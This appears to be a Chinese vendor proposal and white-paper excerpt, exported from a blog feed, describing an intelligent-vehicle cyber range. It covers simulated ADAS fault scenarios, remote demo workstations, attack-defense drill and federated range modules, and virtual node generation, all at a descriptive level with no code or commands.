title="自动驾驶演示模块"></a>自动驾驶演示模块</h3><p>功能参数如下：</p><ol><li>支持SUA场景的攻防：意外加速<ol><li>自适应巡航ACC利用国道自动驾驶；</li><li>车辆突然加速到设定速度以上；</li><li>ACC不可以解除，与前车追尾。</li></ol></li><li>支持LKA场景的攻防：车道保持辅助功能故障<ol><li>使用车道保持辅助装置自动驾驶；</li><li>车道保持辅助装置故障，导致车辆驶入侧车道；</li><li>与左侧车道车辆发生追尾。</li></ol></li><li>支持AEB场景的攻防：自主紧急制动失效<ol><li>利用ACC的高速公路自动驾驶；</li><li>制动出现异常信号，车辆突然制动；</li><li>被后车追尾。</li></ol></li><li>支持TSR场景的攻防：交通标志识别故障<ol><li>利用ACC的高速公路自动驾驶；</li><li>交通标志（限速标志）识别故障，导致超速行驶；</li><li>未确保ACC安全制动距离，与前车相撞。</li></ol></li><li>支持EO场景的攻防；发动机意外熄火<ol><li>驾驶员在市内道路上行驶；</li><li>当进入交叉口是，发动机意外熄火；</li><li>无法重新启动，导致追尾事故。</li></ol></li><li>支持EOC场景的攻防：油门故障<ol><li>驾驶员在高速公路上行驶；</li><li>在直行加速区域行驶中，由于油门故障无法加速反而减速；</li><li>导致与后方车辆发生追尾事故。</li></ol></li><li>支持EB场景的攻防：制动失效<ol><li>驾驶员在国道上行驶；</li><li>进入紧急弯道区域；</li><li>因制动故障，无法控制车速，导致车道偏离。</li></ol></li><li>支持IHBC场景的攻防：智能远光灯控制故障<ol><li>驾驶员在国道上行驶；</li><li>进入急转弯车道区域；</li><li>自动变换近光灯和远光灯，无法辨别车道，导致偏离车道。</li></ol></li></ol><p>为验证自动驾驶的安全性与可靠性，本方案搭建一套基于沙盘的自动驾驶演示场景，演示步骤为：</p><p>1. 环境搭建：准备一个沙盘模型，代表一个道路网络和周围环境。使用合适的比例和细节来模拟真实的道路情况，包括车道、交叉口、路标、交通信号灯等。</p><p>2. 车辆模拟：选择一个或多个自动驾驶车辆模型，并放置在沙盘上。确保车辆模型与实际车辆的尺寸和特征相匹配。</p><p>3. 传感器模拟：为车辆模型添加传感器模拟器，模拟自动驾驶车辆常用的传感器，如摄像头、激光雷达、雷达等。这些传感器将用于感知周围环境并获取数据。</p><p>4. 自动驾驶算法：为车辆模型加载自动驾驶算法，模拟车辆的决策和控制过程。这些算法可以是预先定义的规则或基于机器学习的模型。</p><p>5. 演示场景设计：设计一个或多个自动驾驶场景，例如道路变道、交叉口通行、避障等。确保场景具有挑战性，并涵盖不同的交通情况和道路条件。</p><p>6. 演示执行：在沙盘上执行自动驾驶演示，模拟车辆的行为和决策过程。观察车辆如何感知环境、做出决策并执行动作。</p><p>7. 故障模拟：模拟自动驾驶系统的故障情况，例如传感器故障、算法错误等。观察系统如何处理故障情况，并评估其容错性和安全性。</p><p>演示模块将通过高保真仿真环境，实时展示自动驾驶系统在各种故障和攻击场景下的行为及其安全防御措施的效果。</p><p>本方案旨在设计和实现一个自动驾驶演示模块，该模块能够模拟并展示包括SUA、LKA、AEB、TSR、EO、EOC、EB和IHBC在内的八种自动驾驶场景的攻防。模块将用于教育、演示和测试自动驾驶系统的安全性。实现方案如下：</p><ol><li>支持SUA场景的攻防：意外加速</li></ol><p>a) 自适应巡航ACC利用国道自动驾驶；</p><p>b) 车辆突然加速到设定速度以上；</p><p>c) ACC不可以解除，与前车追尾。</p><p>实现方案：在仿真环境中编程模拟ACC系统的软件缺陷，使其在特定条件下触发意外加速，并锁定ACC，阻止驾驶员解除控制，直至发生追尾，以此来演示系统的攻击响应和紧急手动干预程序。</p><ol><li>支持LKA场景的攻防：车道保持辅助功能故障</li></ol><p>a) 使用车道保持辅助装置自动驾驶；</p><p>b) 车道保持辅助装置故障，导致车辆驶入侧车道；</p><p>c) 与左侧车道车辆发生追尾。</p><p>实现方案：通过模拟车道保持系统接收错误的车道标记信息或系统故障，使得车辆错误地判断车道位置并驶向侧车道，进而演示故障发生时的车辆行为和紧急措施。</p><ol><li>支持AEB场景的攻防：自主紧急制动失效</li></ol><p>a) 利用ACC的高速公路自动驾驶；</p><p>b) 制动出现异常信号，车辆突然制动；</p><p>c) 被后车追尾。</p><p>实现方案：在模拟系统中引入虚假的障碍物或故障信号，导致AEB系统异常激活，引发突然制动，以此来测试后续车辆的反应能力和系统的故障处理机制。</p><ol><li>支持TSR场景的攻防：交通标志识别故障</li></ol><p>a) 利用ACC的高速公路自动驾驶；</p><p>b) 交通标志（限速标志）识别故障，导致超速行驶；</p><p>c) 未确保ACC安全制动距离，与前车相撞。</p><p>实现方案：模拟交通标志识别系统无法正确读取或解释限速标志，导致ACC未能调整车速，从而模拟超速行驶至追尾的场景，同时评估紧急情况下的人工干预效果。</p><ol><li>支持EO场景的攻防；发动机意外熄火</li></ol><p>a) 驾驶员在市内道路上行驶；</p><p>b) 当进入交叉口是，发动机意外熄火；</p><p>c) 无法重新启动，导致追尾事故。</p><p>实现方案：通过模拟发动机控制单元的故障信号，引起发动机突然熄火，特别是在交叉口等关键地点，来测试车辆的应急反应和驾驶员的干预能力。</p><ol><li>支持EOC场景的攻防：油门故障</li></ol><p>a) 驾驶员在高速公路上行驶；</p><p>b) 在直行加速区域行驶中，由于油门故障无法加速反而减速；</p><p>c) 导致与后方车辆发生追尾事故。</p><p>实现方案：设置模拟油门传感器故障，使得油门响应不当，无法正常加速甚至减速，从而展示在高速行驶中油门故障对车辆控制的影响及后果。</p><ol><li>支持EB场景的攻防：制动失效</li></ol><p>a) 驾驶员在国道上行驶；</p><p>b) 进入紧急弯道区域；</p><p>c) 因制动故障，无法控制车速，导致车道偏离。</p><p>实现方案：通过编程模拟制动系统的失效，特别是在紧急弯道区域，来观察和演示无法控制车速时的车辆行为和紧急逃逸策略。</p><ol><li>支持IHBC场景的攻防：智能远光灯控制故障</li></ol><p>a) 驾驶员在国道上行驶；</p><p>b) 进入急转弯车道区域；</p><p>c) 自动变换近光灯和远光灯，无法辨别车道，导致偏离车道。</p><p>实现方案：仿真智能远光灯控制系统的故障，导致在急转弯区域无法正确切换灯光模式，从而模拟因视线不清导致的车道偏离事件，并评估驾驶员的应对措施。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/90f07c0898cdc2c9066333c79da5d6c4.png"></p><h3 id="异地互联演示模块"><a href="#异地互联演示模块" class="headerlink" title="异地互联演示模块"></a>异地互联演示模块</h3><p>我司为本项目提供的异地互联演示工作站信息如下：</p><p>品牌：联想</p><p>型号：Thinkstation P3</p><p>数量：1套</p><p>指标参数信息如下：</p><p>工作站支持至强® W-2223或性能更高的CPU，内存16G DDR4，显卡12G显存，存储500G SSD。</p><p>功能参数如下：</p><ol><li>支持汽车信息安全攻防渗透平台的屏幕迁移与安装；</li><li>支持远程循环播放靶场演练实时宏观、微观态势可视化；</li><li>支持支持大规模车联网攻防演练播放，支持200个车端节点的攻防演练播放；</li><li>提供互联演示工作站。</li></ol><p>本方案搭建一套基于XXXX智能汽车网络靶场的异地互联演示，该演示场景主要通过搭建本地工作站，然后通过工作站来对靶场进行访问展示。</p><p>异地互联演示模块将一个屏幕的内容实时传输到另一个屏幕上。该模块还支持在不同地理位置的信息安全攻防渗透平台上进行安装，注重信息安全，提供了加密和认证等措施。</p><p>异地互联演示模块允许用户远程控制靶场演练的循环播放功能，提供了宏观态势的可视化功能，还支持对微观态势的可视化。</p><p>异地互联演示模块具备播放车联网攻防演练的功能，能够支持200个车端节点的同时播放，并且在进行大规模车联网攻防演练时，充分考虑信息安全问题。</p><p>异地互联演示模块实现多个设备之间的互联演示，工作站支持屏幕共享功能，可以将一个设备的屏幕内容实时传输到其他连接的设备上。工作站具备多设备控制能力，可以通过一个主控设备操控其他连接的设备。工作站支持多种类型的媒体文件播放，工作站提供互动功能，可以让与会者进行实时问答和讨论。工作站具备安全性保障功能，能够对设备间的连接和数据传输进行加密和防护。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/879402edbf1bced848a71ac6e4d3ec28.png"></p><h3 id="整车厂网络攻防演练演示模块"><a href="#整车厂网络攻防演练演示模块" class="headerlink" title="整车厂网络攻防演练演示模块"></a>整车厂网络攻防演练演示模块</h3><p>功能参数如下：</p><ol><li>支持办公区、开发测试区、安全运营中心、内网服务器集群、业务服务器集群等区域的拓扑编辑与显示；</li><li>支持大规模目标网络构建、数据管理、试验实时指挥、用户行为监控、态势展示和联邦靶场互联互通等核心能力。</li><li>支持包括基础设施、目标网络管理、大数据统一管理、试验支撑、试验配置管理、分布式适配、数据采集、态势分析等系统。</li><li>支持的基础设施包括虚拟计算资源、运维管理资源和实物仿真资源以及其他专用硬件资源等。</li><li>支持目标网络管理，接收业务层的目标网络配置信息，利用虚拟化技术生成KVM虚拟节点、Docker容器节点，网络虚拟化通过SDN及网络虚拟化技术将仿真的虚拟化节点构建出虚拟仿真网络，并结合虚拟互联技术，将实体设备透明接入到虚拟网络，从而构建出一个逼真的静态目标网络，并利用接入及管理组件实现对整个目标网络的管理。</li><li>支持大数据统一管理，将采集到的数据以及靶场资源库中的靶标、漏洞、知识图谱等进行存储管理。</li><li>支持提供系统资源服务的监控与管理等相关服务，拓扑配置对仿真的目标网络进行主机设备、网络设备、链路等进行配置描述。</li><li>支持对靶场的人员、靶标、访问控制、状态监控、资源分配、任务编排、过程导调、任务导调进行管理与控制，可针对任务的控制、靶标和场景进行分配，支持攻防演练任务管理、成果管理。</li><li>支持负责与其他分靶场的目标网络和靶标互联互通的分布式配置。</li><li>支持从目标网络中通过带外采集与链路采集获取节点状态信息、机器内部操作、网络流量等信息。</li><li>支持利用采集的数据对特征进行深度挖掘与分析，通过态势分析进行安全事件关联、安全态势计算，从而为业务层的可视化提供数据支撑。</li></ol><p>为实现的整车厂网络攻防演练演示模块的要求，我方提供如下实现方案：</p><p>1. 拓扑编辑与显示模块：</p><p>功能参数如下：提供一个可视化界面，支持办公区、开发测试区、安全运营中心、内网服务器集群、业务服务器集群等区域的拓扑编辑和显示。</p><p>功能参数如下：用户可以通过拖拽和连接的方式创建和配置不同区域的网络拓扑，包括主机设备、网络设备和链路等。</p><p>2. 目标网络管理模块：</p><p>功能参数如下：接收业务层的目标网络配置信息，并利用虚拟化技术生成KVM虚拟节点、Docker容器节点，构建虚拟仿真网络。</p><p>功能参数如下：使用SDN和网络虚拟化技术将实体设备透明接入虚拟网络，实现整个目标网络的管理和控制。</p><p>3. 大数据统一管理模块：</p><p>功能参数如下：存储管理采集到的数据和靶场资源库中的靶标、漏洞、知识图谱等。</p><p>功能参数如下：提供数据查询、检索和分析功能，支持对采集数据和靶场资源的统一管理和利用。</p><p>4. 系统资源监控与管理模块：</p><p>功能参数如下：监控和管理提供系统资源服务的相关服务，包括虚拟计算资源、运维管理资源、实物仿真资源等。</p><p>功能参数如下：提供资源状态监控、资源分配和任务编排等功能，以确保资源的有效利用和任务的顺利执行。</p><p>5. 分布式配置与联通模块：</p><p>功能参数如下：支持与其他分靶场的目标网络和靶标进行互联互通，实现分布式配置和联合攻防演练。</p><p>6. 采集与分析模块：</p><p>功能参数如下：通过带外采集和链路采集获取目标网络中节点的状态信息、机器内部操作、网络流量等。</p><p>功能参数如下：对采集的数据进行深度挖掘和分析，进行态势分析和安全事件关联，为业务层的可视化提供数据支持。</p><p>7. 任务管理与控制模块：</p><p>功能参数如下：管理和控制靶场的人员、靶标、访问控制、状态监控、资源分配、任务编排等。</p><p>功能参数如下：支持攻防演练任务管理和成果管理，对任务、靶标和场景进行分配和控制。</p><p>通过以上模块的设计和集成，可以构建一个功能完备的整车厂网络攻防演练演示平台</p><p>整车厂网络攻防演练演示模主要包含以下功能：</p><p>整车厂网络攻防演练演示模块方便地编辑和显示各个区域的拓扑结构。在拓扑编辑界面，使用图形化工具来绘制和编辑拓扑结构。通过拓扑编辑与显示功能，可以帮助用户更好地理解和管理各个区域的设备和资源。</p><p>整车厂网络攻防演练演示模块可以帮助用户构建和管理大规模的目标网络。提供了灵活的数据管理功能，可以帮助用户有效地管理和组织大量的网络数据。并且支持试验实时指挥功能，可以帮助用户对目标网络进行实时调度和控制。还具备用户行为监控的能力，可以对目标网络中的用户行为进行实时监测和分析。支持态势展示功能，可以将目标网络的实时状态和信息以图形化的方式展示出来。支持联邦靶场的互联互通功能，可以将不同的靶场环境进行联合和协同。</p><p>整车厂网络攻防演练演示模块包括目标网络管理、基础设施、试验支撑、大数据统一管理、分布式适配、试验配置管理、态势分析、数据采集系统。</p><p>整车厂网络攻防演练演示模块包括运维管理资源、虚拟计算资源以及实物仿真资源等硬件资源。</p><p>整车厂网络攻防演练演示模块具备将采集到的数据以及靶场资源库中的靶标、漏洞、知识图谱等进行存储管理等功能。</p><p>整车厂网络攻防演练演示模块通过系统资源服务的监控与管理，实时监控和管理系统中的各类资源，还具备拓扑配置功能，可以对目标网络进行配置描述。</p><p>整车厂网络攻防演练演示模块具备组织和控制攻防演练任务的工具，对相关的人员、设备和资源进行管理，确保演练任务的顺利进行。</p><p>整车厂网络攻防演练演示模块具备靶标互联互通与其他分靶场的目标网络分布式配置功能。</p><p>整车厂网络攻防演练演示模块带外采集是通过与目标网络连接的外部设备或系统来获取信息。链路采集是通过在目标网络上的特定链路上捕获和分析数据包来获取网络流量等信息。</p><p>整车厂网络攻防演练演示模块特征深度挖掘与分析是指对采集到的数据进行细致的分析和挖掘，以识别出潜在的特征或规律。态势分析是指根据采集到的数据，对安全事件进行关联和计算，以形成全面的安全态势。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/5406d1f4dc9dc05cb6c598c0ff5b7df8.png"></p><h3 id="联邦靶场攻防演练演示模块"><a href="#联邦靶场攻防演练演示模块" class="headerlink" title="联邦靶场攻防演练演示模块"></a>联邦靶场攻防演练演示模块</h3><p>功能参数如下：</p><ol><li>支持通过联邦靶场进行一次全流程的攻防演练，包含试验配置、目标网络规划、态势可视化配置、以及试验控制；</li><li>支持在联邦靶场对分靶场的注册进行管理，分靶场可授权分项的资源；</li><li>支持在联邦靶场的主靶场中查看分靶场的靶标、赛题、镜像等资源；</li><li>支持在联邦靶场的主靶场统一进行试验任务的调度，包括试验的开始、暂停、结束；</li><li>支持试验中接收分布式联邦靶场的攻击分析数据，并关联到对应试验后发送到可视化进行展示；</li><li>支持在联邦靶场的态势可视化中查看所有靶场的攻击信息以及攻击路径可视化；</li><li>支持在联邦靶场的主靶场查看分靶场分项的基础攻击子图和复杂攻击子图，并关联试验任务注册到有效攻击检测；</li><li>演示场景的主分靶场支持双向身份认证功能，可基于PKI证书进行身份认证。</li></ol><p>为满足联邦靶场攻防演练演示的要求，我方提供以下方案：</p><p>1. 联邦靶场全流程支持模块：</p><p>功能参数如下：提供试验配置功能，包括目标网络规划、赛题选择、镜像配置等。</p><p>功能参数如下：支持态势可视化配置，包括攻击信息展示、攻击路径可视化等。</p><p>功能参数如下：提供试验控制功能，包括试验的开始、暂停和结束。</p><p>2. 分靶场注册与资源管理模块：</p><p>功能参数如下：在联邦靶场中管理分靶场的注册信息，包括分靶场的身份认证和授权。</p><p>功能参数如下：支持分靶场授权分项的资源，例如靶标、赛题、镜像等。</p><p>3. 主靶场查看分靶场资源模块：</p><p>功能参数如下：在联邦靶场的主靶场中提供查看分靶场的靶标、赛题、镜像等资源的功能。</p><p>4. 统一试验任务调度模块：</p><p>功能参数如下：在联邦靶场的主靶场中统一进行试验任务的调度，包括试验的开始、暂停和结束。</p><p>功能参数如下：管理试验任务的状态和进度，确保试验任务的顺利执行。</p><p>5. 攻击分析数据接收与可视化展示模块：</p><p>功能参数如下：在试验过程中，支持接收分布式联邦靶场的攻击分析数据。</p><p>功能参数如下：将攻击分析数据关联到对应的试验，并发送到可视化模块进行展示。</p><p>6. 联邦靶场态势可视化模块：</p><p>功能参数如下：在联邦靶场的态势可视化中，展示所有靶场的攻击信息和攻击路径可视化。</p><p>功能参数如下：提供综合的攻击态势分析，帮助用户全面了解联邦靶场的安全状况。</p><p>7. 分项攻击子图与有效攻击检测模块：</p><p>功能参数如下：在联邦靶场的主靶场中，提供查看分靶场分项的基础攻击子图和复杂攻击子图的功能。</p><p>功能参数如下：将试验任务注册到有效攻击检测模块，确保攻击的准确检测和分析。</p><p>8. 双向身份认证模块：</p><p>功能参数如下：在演示场景的主分靶场中，支持双向身份认证功能。</p><p>功能参数如下：基于PKI证书进行身份认证，确保安全的通信和访问控制。</p><p>通过以上模块的设计和集成，可以构建一个满足联邦靶场攻防演练演示要求的系统。</p><p>联邦靶场攻防演练演示模块主要功能如下：</p><p>联邦靶场攻防演练演示模块支持通过联邦靶场进行试验配置，支持通过联邦靶场进行目标网络规划，支持通过联邦靶场进行态势可视化配置，支持通过联邦靶场进行试验控制。</p><p>联邦靶场攻防演练演示模块在联邦靶场中，分靶场是指独立的演练单位，每个分靶场都有自己的资源和权限。在注册分靶场时，指定分靶场所需的资源范围和权限。注册管理还涉及对分靶场进行身份验证和安全审核。</p><p>联邦靶场攻防演练演示模块主靶场可以列出所有已注册的分靶场，并显示各个分靶场所设定的靶标。主靶场可以提供赛题的列表，包括每个分靶场所设定的赛题和相应的难度级别。主靶场可以展示每个分靶场所使用的镜像，包括操作系统、应用软件、漏洞环境等。</p><p>联邦靶场攻防演练演示模块主靶场根据事先设定的计划，开始启动各个分靶场的试验任务。主靶场具备暂停试验任务的权限，可以暂停某个或所有试验任务。主靶场根据试验任务计划或者管理员的指令，统一结束各个分靶场的试验任务。</p><p>联邦靶场攻防演练演示模块主靶场具备接收分布式联邦靶场的攻击分析数据的功能。一旦主靶场接收到分布式联邦靶场的攻击分析数据，根据相应的试验任务进行数据关联。主靶场具备相应的数据存储能力，将接收到的攻击分析数据存储在可靠的数据库中。主靶场使用合适的可视化工具或平台，对关联的攻击分析数据进行展示。</p><p>联邦靶场攻防演练演示模块每个靶场需要能够收集自身的攻击信息，并将其传输到联邦靶场的数据中心或中央服务器。联邦靶场具备强大的数据存储和处理能力，以接收、存储并分析来自各个靶场的攻击信息。联邦靶场的态势可视化系统具备展示各个靶场的攻击信息的功能。联邦靶场的态势可视化系统能够展示攻击路径的可视化。</p><p>联邦靶场攻防演练演示模块每个分靶场收集和保存自身的基础攻击子图数据。在分靶场基础攻击子图的基础上，进一步融合多个分靶场的攻击信息，生成复杂攻击子图。联邦靶场的主靶场实现有效攻击检测算法，并与分靶场的攻击子图进行关联。联邦靶场主靶场的态势可视化系统具备展示分靶场的基础攻击子图和复杂攻击子图的功能。</p><p>联邦靶场攻防演练演示模块建在主分靶场中建立一个PKI基础设施。</p><p>在PKI基础设施中，为每个实体生成公钥和私钥，并使用CA的根证书对公钥进行签名，生成PKI证书。在主分靶场的通信环境中，配置双向身份认证功能。在通信过程中，客户端和服务器通过交换彼此的PKI证书，并通过验证证书的合法性和完整性来进行身份验证。一旦双方成功进行身份认证，可以建立安全通信通道，并使用加密算法对数据进行保护，确保通信的机密性和完整性。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/481ad1d45c39444368a0ecfa80b944e2.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>国利网安靶场基础平台技术白皮书</title>
      <link href="posts/e9d5364/"/>
      <url>posts/e9d5364/</url>
      
        <content type="html"><![CDATA[<p><strong>国利网安靶场基础平台技术白皮书</strong></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20231227023740.png"></p><p>浙江国利网安科技有限公司</p><p>目 录</p><p>1 智能汽车网络靶场目标网络管理分系统 1</p><p>1.1 虚拟节点生成模块 1</p><p>1.2 目标网络调度模块 17</p><p>1.3 目标网络管理模块 21</p><p>1.4 虚实互联管理模块 25</p><p>1.5 虚拟网络支撑模块 30</p><p>1.6 流量仿真模块 41</p><p>2 智能汽车网络靶场试验支撑分系统 51</p><p>2.1 资源管理模块 54</p><p>2.2 运维管理模块 74</p><p>3 智能汽车网络靶场试验配置管理分系统 76</p><p>3.1 汽车安全测试模块 76</p><p>3.2 汽车安全演练模块 107</p><p>3.3 汽车安全众测模块 115</p><p>3.4 试验场景设置模块 117</p><p>3.5 试验导调模块 129</p><p>3.6 网络安全攻防与汽车测评教学培训模块 135</p><p>3.7 网络安全攻防与汽车测评竞赛模块 145</p><p>4 智能汽车网络靶场数据采集分系统 150</p><p>4.1 节点状态采集模块 150</p><p>4.2 网络链路采集模块 156</p><p>4.3 多元网络安全知识库模块 162</p><p>4.4 复杂攻击知识匹配流计算模块 167</p><p>4.5 多模态网络仿真数据库模块 170</p><p>4.6 靶场信息库模块 173</p><p>4.7 试验数据库模块 177</p><p>5 智能汽车网络靶场态势分析分系统 195</p><p>5.1 总体概述 195</p><p>5.2 系统架构 196</p><p>5.3 态势分析控制管理模块 197</p><p>5.4 网络安全场景知识图谱模块 200</p><p>5.4.2 方案简介 203</p><p>5.5 攻击检测研判模块 208</p><p>5.5.1 方案设计 210</p><p>5.5.2 方案简介 212</p><p>5.6 态势可视化展示模块 213</p><p>5.7 安全分析评估模块 219</p><p>5.7.2 方案简介 221</p><p>5.8 资产漏洞探测模块 223</p><p>5.8.2 方案简介 225</p><p>5.9 安全事件检测模块 227</p><p>5.9.1 方案简介 228</p><p>5.10 安全数据融合 230</p><p>5.10.2 方案简介 231</p><p>5.11 关键功能截图 234</p><p>6 智能汽车网络靶场分布式适配分系统 238</p><p>6.1 分布式试验管控模块 238</p><p>6.1.2 方案简介 240</p><p>6.2 分布式目标网络互联模块 241</p><p>6.2.2 方案简介 243</p><p>6.3 分布式态势分析互联模块 243</p><p>6.3.1 方案设计 244</p><p>6.3.2 方案简介 245</p><p>6.4 联邦互联模块 250</p><p>6.4.1 方案设计 250</p><p>6.4.2 方案简介 252</p><p>7 智能汽车网络靶场安全特征采集设备 254</p><p>7.1 总体概述 254</p><p>7.2 靶场安全特征采集设备 254</p><p>7.2.1 采集数据流智能分发设备 255</p><p>7.2.2 靶场定制全流量威胁检测 256</p><p>7.2.3 靶场定制应用协议威胁特征检测 268</p><p>7.2.4 靶场定制多层协议异常特征检测 270</p><p>7.2.5 靶场定制漏洞特征采集 271</p><h1 id="智能汽车网络靶场目标网络管理分系统"><a href="#智能汽车网络靶场目标网络管理分系统" class="headerlink" title="智能汽车网络靶场目标网络管理分系统"></a>智能汽车网络靶场目标网络管理分系统</h1><h2 id="虚拟节点生成模块"><a href="#虚拟节点生成模块" class="headerlink" title="虚拟节点生成模块"></a>虚拟节点生成模块</h2><ul><li>提供仿真环境中常规IT设备的虚拟化，包括服务器节点、客户端节点、二层交换、三层交换、动态路由、虚拟安全设备节点等不同功能类型节点的生成，支持常见网络和安全设备，包括路由器、防火墙、IDS、WAF等，提供产品功能截图证明；</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20231227023752.png" alt="1703330319004"></p><p>本系统为用户提供了一个仿真环境，用于生成和管理包括服务器节点、客户端节点、二层交换节点、三层交换节点、动态路由节点及各类虚拟安全设备节点在内的常规IT设备虚拟化服务。该仿真环境可以模拟多种不同功能类型的节点，从而满足用户对于复杂网络构建和安全测试的需求。</p><p>此仿真环境支持包括路由器、防火墙、入侵检测系统（IDS）、Web应用防火墙（WAF）在内的常见网络和安全设备的虚拟化和配置。仿真环境内的这些虚拟化设备旨在提供与实体设备相似的网络安全功能和网络管理功能，用户通过仿真操作可以在无需实物设备的情况下测试网络设计方案和安全防护策略。</p><ul><li>支持汽车信息安全室内测试场景的虚拟节点生成，同时支持不少于10个车型、100个智能网联零部件的虚拟化生成，至少满足3种虚拟节点的混合生成包含X86架构虚拟节点、ARM架构（不限于ARM32、ARM64）虚拟节点、容器节点，支持在同一二层网络中支持三种虚拟化节点共存。提供的车联网控制器虚拟节点类型应包含Linux控制器、Android控制器，提供的车联网业务平台至应包含汽车智能网联业务管理平台、内容分发服务平台。</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20231227024857.png"></p><p>虚拟节点生成</p><p>本系统支持创建用于汽车信息安全室内测试的虚拟节点，能够模拟多达10种车型与100种智能网联部件的虚拟化环境。为满足混合环境的测试需求，系统设计包括至少三种类型的虚拟节点：遵循x86架构的虚拟节点、支持多种标准包括ARM32与ARM64的ARM架构虚拟节点以及基于容器技术的节点。三种虚拟化节点能在统一的二层网络架构中协同工作，此成果得益于精细的网络设计与配置策略。系统提供的车联网控制器虚拟节点类型，包括模拟Linux操作系统控制器与Android操作系统控制器。系统所提供的车联网业务平台覆盖面广，包含汽车智能网联业务管理平台与内容分发服务平台等，各平台均设有符合操作逻辑的功能界面，以便技术人员进行有效管理。</p><ul><li>支持仿真的节点类型不少于10种，至少包含车机、TBOX、网关、服务器、客户端、二层交换机、三层交换机、动态路由、公网路由、防火墙。提供产品功能截图证明，截图中需包含以上节点类型并清晰识别。</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20231227024911.png" alt="1703330571401"></p><p>功能参数设计方面，系统提供广泛的虚拟化能力，能够生成多种类型的虚拟节点，包括服务器节点、客户端节点、二层交换、三层交换、动态路由以及虚拟安全设备节点。此外，系统还支持多种网络和安全设备的模拟，如路由器、防火墙、IDS、WAF等，为用户提供了全面的仿真环境。</p><p>针对汽车信息安全领域，系统的虚拟节点生成功能非常强大。它可以同时生成不同车型和智能网联零部件的虚拟节点，包括X86架构虚拟节点、ARM架构虚拟节点（ARM32和ARM64）以及容器节点。这些节点能够在同一二层网络中协同运行，提供了更真实和复杂的测试场景。系统还支持多种车联网控制器虚拟节点类型，如Linux控制器和Android控制器，以及车联网业务平台，如汽车智能网联业务管理平台和内容分发服务平台，满足不同用例的需求。</p><p>性能参数设计方面，系统具备高度扩展性。它能够支持最多400个虚拟节点的生成，确保用户在仿真测试中拥有足够的资源。虚拟节点的最小创建时间不超过10分钟，保证了测试过程的高效性。此外，系统支持通过模板生成新的网络拓扑，生成时间迅速，不超过2秒，提升了用户的操作效率。系统还提供了多达10种不同类型的仿真节点，涵盖了车机、TBOX、网关、服务器、客户端、二层交换机、三层交换机、动态路由、公网路由和防火墙，满足了各种复杂测试场景的要求。这些性能参数的设计确保了系统能够高效地应对大规模仿真和测试的挑战。</p><p>虚拟节点生成模块会根据测试配置管理的资源需求,向基础设施申请所需的虚拟计算资源,然后使用这些资源生成各类虚拟节点,如虚拟机、容器、网络设备等。</p><p>它可以生成虚拟机节点、轻量级容器节点、虚拟网络设备和虚拟安全设备等多类型虚拟节点。这为构建联邦的虚拟靶场提供了关键的虚拟化支持。</p><p>测试人员可以通过测试配置管理向其提出资源需求,它会自动化生成对应类型和规格的虚拟节点。大大简化了虚拟环境的部署配置,使用户可以专注于测试业务本身。</p><p>这样通过虚拟技术模拟各类网络功能与设备,在保障测试需求的同时,也提高了资源利用效率,降低了靶场建设成本。</p><p>虚拟化软件支持现有市场上主要国内外操作系统，包括Windows、CentOS、Fedora、RedHat、SUSE、Ubuntu。基于KVM开发，虚拟化软件兼容OpenStack Pike等主流版本。虚拟设备基于KVM开发，虚拟化软件兼容OpenStack Pike等主流版本。</p><p>虚拟节点支持ARM架构虚拟机、X86架构虚拟机、容器的混合生成，并且在同一二层网络中支持三种虚拟化节点的共存是通过合理的网络设计和配置来实现的。</p><p>系统支持提供VPC网络、经典网络、弹性IP、负载均衡、防火墙、安全组、云解析DNS、NAT网关、QoS等网络服务；可查看VPC网络的ID/名称、状态、IPv4 CIDR、IPv6 CIDR、私有网络、防火墙、外部网关、私网域名、组织等信息。</p><p>支持CPU隔离技术，将指定的CPU从主机的多核平衡调度策略中移除；CPU被隔离后，系统不会自动把任务放到隔离的CPU上运行，隔离的CPU专用于虚拟机CPU绑定的物理CPU、DPDK绑定的物理CPU，以避免出现主机CPU一直处于忙碌状态，而一些重要业务的虚拟机或者主机启用DPDK功能时获取主机CPU资源过慢的情况，影响业务的处理速度。</p><p>结合云管理平台和服务器虚拟化平台，可实现层次化端口绑定功能，可有效突破4K可用VLAN的限制。</p><p>虚拟化主机空载时的CPU利用率小于5%；虚拟化主机空载时的内存利用率&lt;5%。</p><h4 id="虚拟交换机"><a href="#虚拟交换机" class="headerlink" title="虚拟交换机"></a>虚拟交换机</h4><p>在信息化技术不断发展的状况下，虚拟化网络逐渐呈现出巨大的发展潜力。相较于传统的交换机，虚拟交换机在许多方面存在优势，因此，在未来通信行业中虚拟交换机技术的应用势在必行。</p><p>虚拟交换机原理：根据拓扑结构可知，虚拟交换机技术的原理相对简单，就本质而言，该项技术就是在逻辑上集成多台物理连接的交换机。该项技术的特点在于通信的可靠性更强，工作效率也得到了提升，系统的带宽容量也得以增加。与传统交换机相比，虚拟交换机不仅可以使STP、VRRP协议运行要求的负载均衡与冗余得以实现。</p><p>在物理环境之中，主机是通过pSwitch连接到网络当中。而在虚拟化环境中，则使用 vswitch。虚拟机通过vSwitch来连接网络，vSwitch是通过主机上的物理网卡作为上行链路与外界网络进行连接。</p><p>跟普通服务器设备一样，每个虚拟机有着自己的虚拟网卡(virtual NIC)，每个 virtual NIC有着自己的MAC地址和IP地址。 Virtual Switch(vSwitch)相当于一个虚拟的二层交换机，该交换机连接虚拟网卡和物理网卡，将虚拟机上的数据报文从物理网口转发出去。与物理交换机一样，vSwitch的作用就是用来转发数据。</p><p>虚拟节点支持ARM架构虚拟机、X86架构虚拟机、容器的混合生成，并且在同一二层网络中支持三种虚拟化节点的共存是通过合理的网络设计和配置来实现的，如下所示。</p><p><img src= 